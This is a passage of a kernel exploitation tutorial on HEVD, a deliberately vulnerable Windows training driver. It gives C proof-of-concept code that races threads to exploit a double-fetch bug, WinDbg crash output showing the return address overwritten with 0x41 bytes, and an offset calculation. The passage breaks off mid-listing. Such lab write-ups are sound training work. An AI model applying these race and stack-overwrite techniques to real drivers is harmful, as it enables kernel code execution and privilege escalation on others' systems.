<a id="__codelineno-14-113" name="__codelineno-14-113"></a><span class="w">    </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-114" name="__codelineno-14-114"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">UserBuffer</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-115" name="__codelineno-14-115"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-116" name="__codelineno-14-116"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate heap buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-117" name="__codelineno-14-117"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-118" name="__codelineno-14-118"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-119" name="__codelineno-14-119"></a>
<a id="__codelineno-14-120" name="__codelineno-14-120"></a><span class="w">    </span><span class="cm">/* Initialize USER_DOUBLE_FETCH struct members */</span><span class="w"></span>
<a id="__codelineno-14-121" name="__codelineno-14-121"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-122" name="__codelineno-14-122"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-123" name="__codelineno-14-123"></a>
<a id="__codelineno-14-124" name="__codelineno-14-124"></a><span class="w">    </span><span class="cm">/* Allocate IO_THREAD_PARAM struct */</span><span class="w"></span>
<a id="__codelineno-14-125" name="__codelineno-14-125"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PIO_THREAD_PARAM</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">IO_THREAD_PARAM</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-14-126" name="__codelineno-14-126"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">IoThreadParam</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-127" name="__codelineno-14-127"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-128" name="__codelineno-14-128"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate memory for IO thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-129" name="__codelineno-14-129"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-130" name="__codelineno-14-130"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-131" name="__codelineno-14-131"></a>
<a id="__codelineno-14-132" name="__codelineno-14-132"></a><span class="w">    </span><span class="cm">/* Initialise IO_THREAD_PARAM struct members */</span><span class="w"></span>
<a id="__codelineno-14-133" name="__codelineno-14-133"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="o">-&gt;</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-134" name="__codelineno-14-134"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="o">-&gt;</span><span class="n">DoubleFetch</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-135" name="__codelineno-14-135"></a>
<a id="__codelineno-14-136" name="__codelineno-14-136"></a>
<a id="__codelineno-14-137" name="__codelineno-14-137"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-138" name="__codelineno-14-138"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-139" name="__codelineno-14-139"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">ChangeSizeHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-140" name="__codelineno-14-140"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">IoControlHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">IoControlThread</span><span class="p">,</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-141" name="__codelineno-14-141"></a>
<a id="__codelineno-14-142" name="__codelineno-14-142"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SetThreadPriority</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="n">THREAD_PRIORITY_TIME_CRITICAL</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">SetThreadPriority</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="n">THREAD_PRIORITY_TIME_CRITICAL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-14-143" name="__codelineno-14-143"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-144" name="__codelineno-14-144"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to set thread priority to highest!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-145" name="__codelineno-14-145"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-146" name="__codelineno-14-146"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Set ChangeSizeThread Priority to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetThreadPriority</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-14-147" name="__codelineno-14-147"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Set IoControlThread Priority to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetThreadPriority</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-14-148" name="__codelineno-14-148"></a>
<a id="__codelineno-14-149" name="__codelineno-14-149"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SetThreadAffinityMask</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">SetThreadAffinityMask</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-14-150" name="__codelineno-14-150"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-151" name="__codelineno-14-151"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to set thread affinity!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-152" name="__codelineno-14-152"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-153" name="__codelineno-14-153"></a>
<a id="__codelineno-14-154" name="__codelineno-14-154"></a><span class="w">        </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-155" name="__codelineno-14-155"></a><span class="w">        </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-156" name="__codelineno-14-156"></a>
<a id="__codelineno-14-157" name="__codelineno-14-157"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WaitForMultipleObjects</span><span class="p">(</span><span class="n">NumProcessors</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="n">INFINITE</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-14-158" name="__codelineno-14-158"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-159" name="__codelineno-14-159"></a><span class="w">            </span><span class="n">TerminateThread</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-160" name="__codelineno-14-160"></a><span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-161" name="__codelineno-14-161"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Terminated change size thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-162" name="__codelineno-14-162"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-163" name="__codelineno-14-163"></a>
<a id="__codelineno-14-164" name="__codelineno-14-164"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WaitForMultipleObjects</span><span class="p">(</span><span class="n">NumProcessors</span><span class="p">,</span><span class="w"> </span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="n">INFINITE</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-14-165" name="__codelineno-14-165"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-166" name="__codelineno-14-166"></a><span class="w">            </span><span class="n">TerminateThread</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-167" name="__codelineno-14-167"></a><span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-168" name="__codelineno-14-168"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Terminated IO control thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-169" name="__codelineno-14-169"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-170" name="__codelineno-14-170"></a>
<a id="__codelineno-14-171" name="__codelineno-14-171"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-172" name="__codelineno-14-172"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-173" name="__codelineno-14-173"></a>
<a id="__codelineno-14-174" name="__codelineno-14-174"></a><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-14-175" name="__codelineno-14-175"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-176" name="__codelineno-14-176"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: Double Fetch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-177" name="__codelineno-14-177"></a>
<a id="__codelineno-14-178" name="__codelineno-14-178"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-179" name="__codelineno-14-179"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenDriverHandle</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-14-180" name="__codelineno-14-180"></a>
<a id="__codelineno-14-181" name="__codelineno-14-181"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Running exploit function!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-182" name="__codelineno-14-182"></a><span class="w">    </span><span class="n">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-183" name="__codelineno-14-183"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<hr>

<h1 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h1>
<p>If we run the above code on our vulnerable machine after a short while we should get an access violation. In the current code we'll get this access violation due to an invalid memory access as we've not actually over filled the buffer yet. However, an access violation is good news, it means we're nearly there.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-15-10">10</a></span>
<span class="normal"><a href="#__codelineno-15-11">11</a></span>
<span class="normal"><a href="#__codelineno-15-12">12</a></span>
<span class="normal"><a href="#__codelineno-15-13">13</a></span>
<span class="normal"><a href="#__codelineno-15-14">14</a></span>
<span class="normal"><a href="#__codelineno-15-15">15</a></span>
<span class="normal"><a href="#__codelineno-15-16">16</a></span>
<span class="normal"><a href="#__codelineno-15-17">17</a></span>
<span class="normal"><a href="#__codelineno-15-18">18</a></span>
<span class="normal"><a href="#__codelineno-15-19">19</a></span>
<span class="normal"><a href="#__codelineno-15-20">20</a></span>
<span class="normal"><a href="#__codelineno-15-21">21</a></span>
<span class="normal"><a href="#__codelineno-15-22">22</a></span>
<span class="normal"><a href="#__codelineno-15-23">23</a></span>
<span class="normal"><a href="#__codelineno-15-24">24</a></span>
<span class="normal"><a href="#__codelineno-15-25">25</a></span>
<span class="normal"><a href="#__codelineno-15-26">26</a></span>
<span class="normal"><a href="#__codelineno-15-27">27</a></span>
<span class="normal"><a href="#__codelineno-15-28">28</a></span>
<span class="normal"><a href="#__codelineno-15-29">29</a></span>
<span class="normal"><a href="#__codelineno-15-30">30</a></span>
<span class="normal"><a href="#__codelineno-15-31">31</a></span>
<span class="normal"><a href="#__codelineno-15-32">32</a></span>
<span class="normal"><a href="#__codelineno-15-33">33</a></span>
<span class="normal"><a href="#__codelineno-15-34">34</a></span>
<span class="normal"><a href="#__codelineno-15-35">35</a></span>
<span class="normal"><a href="#__codelineno-15-36">36</a></span>
<span class="normal"><a href="#__codelineno-15-37">37</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a>Access violation - code c0000005 (!!! second chance !!!)
<a id="__codelineno-15-2" name="__codelineno-15-2"></a>HEVD!TriggerDoubleFetch+0x136:
<a id="__codelineno-15-3" name="__codelineno-15-3"></a>fffff801`11086952 c3              ret
<a id="__codelineno-15-4" name="__codelineno-15-4"></a>
<a id="__codelineno-15-5" name="__codelineno-15-5"></a>1: kd&gt; !analyze
<a id="__codelineno-15-6" name="__codelineno-15-6"></a>Connected to Windows 10 14393 x64 target at (Sat May 21 16:06:24.400 2022 (UTC + 1:00)), ptr64 TRUE
<a id="__codelineno-15-7" name="__codelineno-15-7"></a>*******************************************************************************
<a id="__codelineno-15-8" name="__codelineno-15-8"></a>*                                                                             *
<a id="__codelineno-15-9" name="__codelineno-15-9"></a>*                        Bugcheck Analysis                                    *
<a id="__codelineno-15-10" name="__codelineno-15-10"></a>*                                                                             *
<a id="__codelineno-15-11" name="__codelineno-15-11"></a>*******************************************************************************
<a id="__codelineno-15-12" name="__codelineno-15-12"></a>
<a id="__codelineno-15-13" name="__codelineno-15-13"></a>Unknown bugcheck code (0)
<a id="__codelineno-15-14" name="__codelineno-15-14"></a>Unknown bugcheck description
<a id="__codelineno-15-15" name="__codelineno-15-15"></a>Arguments:
<a id="__codelineno-15-16" name="__codelineno-15-16"></a>Arg1: 0000000000000000
<a id="__codelineno-15-17" name="__codelineno-15-17"></a>Arg2: 0000000000000000
<a id="__codelineno-15-18" name="__codelineno-15-18"></a>Arg3: 0000000000000000
<a id="__codelineno-15-19" name="__codelineno-15-19"></a>Arg4: 0000000000000000
<a id="__codelineno-15-20" name="__codelineno-15-20"></a>
<a id="__codelineno-15-21" name="__codelineno-15-21"></a>Debugging Details:
<a id="__codelineno-15-22" name="__codelineno-15-22"></a>------------------
<a id="__codelineno-15-23" name="__codelineno-15-23"></a>
<a id="__codelineno-15-24" name="__codelineno-15-24"></a>BUGCHECK_CODE:  0
<a id="__codelineno-15-25" name="__codelineno-15-25"></a>BUGCHECK_P1: 0
<a id="__codelineno-15-26" name="__codelineno-15-26"></a>BUGCHECK_P2: 0
<a id="__codelineno-15-27" name="__codelineno-15-27"></a>BUGCHECK_P3: 0
<a id="__codelineno-15-28" name="__codelineno-15-28"></a>BUGCHECK_P4: 0
<a id="__codelineno-15-29" name="__codelineno-15-29"></a>
<a id="__codelineno-15-30" name="__codelineno-15-30"></a>PROCESS_NAME:  DoubleFetchPoc.exe
<a id="__codelineno-15-31" name="__codelineno-15-31"></a>ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
<a id="__codelineno-15-32" name="__codelineno-15-32"></a>SYMBOL_NAME:  HEVD!TriggerDoubleFetch+136
<a id="__codelineno-15-33" name="__codelineno-15-33"></a>MODULE_NAME: HEVD
<a id="__codelineno-15-34" name="__codelineno-15-34"></a>IMAGE_NAME:  HEVD.sys
<a id="__codelineno-15-35" name="__codelineno-15-35"></a>FAILURE_BUCKET_ID:  ACCESS_VIOLATION_HEVD!TriggerDoubleFetch
<a id="__codelineno-15-36" name="__codelineno-15-36"></a>FAILURE_ID_HASH:  {d6d20acb-bd59-8959-eb71-904d3e00084e}
<a id="__codelineno-15-37" name="__codelineno-15-37"></a>Followup:     MachineOwner
</code></pre></div></td></tr></table></div>
<p>Now that we know we can invoke an access violation the next goal is overwriting the return address and proving that we can turn this vulnerability into code execution. We'll start by filling the buffer with As and then flipping the size value like we've just done, this will prove that we can gain control of ret. Following that we'll then figure out at what offset we gain control of the instruction pointer. First we'll need to make some modifications to our POC, as shown below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
<span class="normal"><a href="#__codelineno-16-2">2</a></span>
<span class="normal"><a href="#__codelineno-16-3">3</a></span>
<span class="normal"><a href="#__codelineno-16-4">4</a></span>
<span class="normal"><a href="#__codelineno-16-5">5</a></span>
<span class="normal"><a href="#__codelineno-16-6">6</a></span>
<span class="normal"><a href="#__codelineno-16-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">UserBufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3000</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-16-2" name="__codelineno-16-2"></a>
<a id="__codelineno-16-3" name="__codelineno-16-3"></a><span class="w">    </span><span class="cm">/* Initialize USER_DOUBLE_FETCH struct members */</span><span class="w"></span>
<a id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-16-6" name="__codelineno-16-6"></a>
<a id="__codelineno-16-7" name="__codelineno-16-7"></a><span class="w">    </span><span class="n">RtlFillMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">);</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>With those changes completed we can simply run the new POC and we should have control of the return address.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-17-10">10</a></span>
<span class="normal"><a href="#__codelineno-17-11">11</a></span>
<span class="normal"><a href="#__codelineno-17-12">12</a></span>
<span class="normal"><a href="#__codelineno-17-13">13</a></span>
<span class="normal"><a href="#__codelineno-17-14">14</a></span>
<span class="normal"><a href="#__codelineno-17-15">15</a></span>
<span class="normal"><a href="#__codelineno-17-16">16</a></span>
<span class="normal"><a href="#__codelineno-17-17">17</a></span>
<span class="normal"><a href="#__codelineno-17-18">18</a></span>
<span class="normal"><a href="#__codelineno-17-19">19</a></span>
<span class="normal"><a href="#__codelineno-17-20">20</a></span>
<span class="normal"><a href="#__codelineno-17-21">21</a></span>
<span class="normal"><a href="#__codelineno-17-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1"></a>Windows 10 Kernel Version 14393 MP (1 procs) Free x64
<a id="__codelineno-17-2" name="__codelineno-17-2"></a>Edition build lab: 14393.2189.amd64fre.rs1_release.180329-1711
<a id="__codelineno-17-3" name="__codelineno-17-3"></a>Machine Name:
<a id="__codelineno-17-4" name="__codelineno-17-4"></a>Kernel base = 0xfffff801`6a811000 PsLoadedModuleList = 0xfffff801`6ab19140
<a id="__codelineno-17-5" name="__codelineno-17-5"></a>System Uptime: 0 days 0:00:00.873
<a id="__codelineno-17-6" name="__codelineno-17-6"></a>KDTARGET: Refreshing KD connection
<a id="__codelineno-17-7" name="__codelineno-17-7"></a>Access violation - code c0000005 (!!! second chance !!!)
<a id="__codelineno-17-8" name="__codelineno-17-8"></a>HEVD!TriggerDoubleFetch+0x136:
<a id="__codelineno-17-9" name="__codelineno-17-9"></a>fffff802`4d6a6952 c3              ret
<a id="__codelineno-17-10" name="__codelineno-17-10"></a>
<a id="__codelineno-17-11" name="__codelineno-17-11"></a>1: kd&gt; k
<a id="__codelineno-17-12" name="__codelineno-17-12"></a> # Child-SP          RetAddr               Call Site
<a id="__codelineno-17-13" name="__codelineno-17-13"></a>00 ffffbc80`5a3d37b8 41414141`41414141     HEVD!TriggerDoubleFetch+0x136 
<a id="__codelineno-17-14" name="__codelineno-17-14"></a>01 ffffbc80`5a3d37c0 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-15" name="__codelineno-17-15"></a>02 ffffbc80`5a3d37c8 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-16" name="__codelineno-17-16"></a>03 ffffbc80`5a3d37d0 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-17" name="__codelineno-17-17"></a>04 ffffbc80`5a3d37d8 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-18" name="__codelineno-17-18"></a>05 ffffbc80`5a3d37e0 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-19" name="__codelineno-17-19"></a>06 ffffbc80`5a3d37e8 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-20" name="__codelineno-17-20"></a>07 ffffbc80`5a3d37f0 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-21" name="__codelineno-17-21"></a>08 ffffbc80`5a3d37f8 41414141`41414141     0x41414141`41414141
<a id="__codelineno-17-22" name="__codelineno-17-22"></a>09 ffffbc80`5a3d3800 41414141`41414141     0x41414141`41414141
</code></pre></div></td></tr></table></div>
<p>Perfect, we clearly have control. Now we need to work out the correct offset for control of the instruction pointer. In the previous code block we sent 3000 bytes in total and we control the return address at <code>ffffbc805a3d37b8</code> and our data is on the stack until <code>ffffbc805a3d3978</code> - we can get the difference between these two numbers and then minus that from the size.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span>
<span class="normal"><a href="#__codelineno-18-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1"></a>1: kd&gt; ? ffffbc80`5a3d3978 - ffffbc80`5a3d37b8
<a id="__codelineno-18-2" name="__codelineno-18-2"></a>Evaluate expression: 448 = 00000000`000001c0
</code></pre></div></td></tr></table></div>
<p>After doing the above I realised that I can actually make my life easier by making the initial size value smaller. In the above output our initial size value is <code>1000</code> as shown below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>But if we actually make this value smaller, say 100 then we don't need to write as far. In the end the offset ended up being at 2056 bytes. The code changes I made are shown below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-20-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-20-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-20-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-20-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-20-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-20-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-20-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-20-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-20-10">10</a></span>
<span class="normal"><a href="#__codelineno-20-11">11</a></span>
<span class="normal"><a href="#__codelineno-20-12">12</a></span>
<span class="normal"><a href="#__codelineno-20-13">13</a></span>
<span class="normal"><a href="#__codelineno-20-14">14</a></span>
